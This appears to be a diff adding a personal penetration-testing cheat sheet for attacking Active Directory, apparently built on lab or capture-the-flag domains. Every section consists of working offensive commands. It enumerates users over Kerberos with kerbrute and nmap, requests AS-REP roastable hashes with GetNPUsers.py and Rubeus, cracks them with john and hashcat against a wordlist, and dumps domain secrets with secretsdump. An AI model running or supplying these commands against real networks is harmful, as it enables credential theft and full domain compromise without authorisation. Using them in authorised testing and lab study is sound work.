@@ -1,0 +1,32 @@
+### Active Directory Enum ###
+
+
+##################
+## Via Kerberos ##
+##################
+cd /home/tristan/perso/secu/win/AD/
+./kerbrute_linux_amd64 userenum --dc $h -d spookysec.local ad-user-mid.txt
+./kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local ad-user-mid.txt
+# or
+nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="{Domain_Name}",userdb={Big_Userlist} {IP}
+
+
+#################################
+## Try no credentials required ##
+#################################
+GetNPUsers.py -request -usersfile found-user.txt -dc-ip $h spookysec.local/
+GetNPUsers.py -request -format john -usersfile found-user.txt -dc-ip $h spookysec.local/
+GetNPUsers.py -request -format hashcat -usersfile found-user.txt -dc-ip $h spookysec.local/
+Rubeus.exe asreproast							# or collect with rubeus
+
+john out --wordlist=~/perso/secu/dict/rockyou.txt --format=krb5asrep
+# MODE 18200 => Kerberos 5 AS-REP etype 23 => hashcat
+hashcat -m 18200 out ~/perso/secu/dict/rockyou.txt			# insert 23$ if needed in hash
+
+
+#################
+## Dump secret ##
+#################
+secretsdump.py -just-dc -dc-ip $h spookysec.local/USER:PASS@$h
+
+
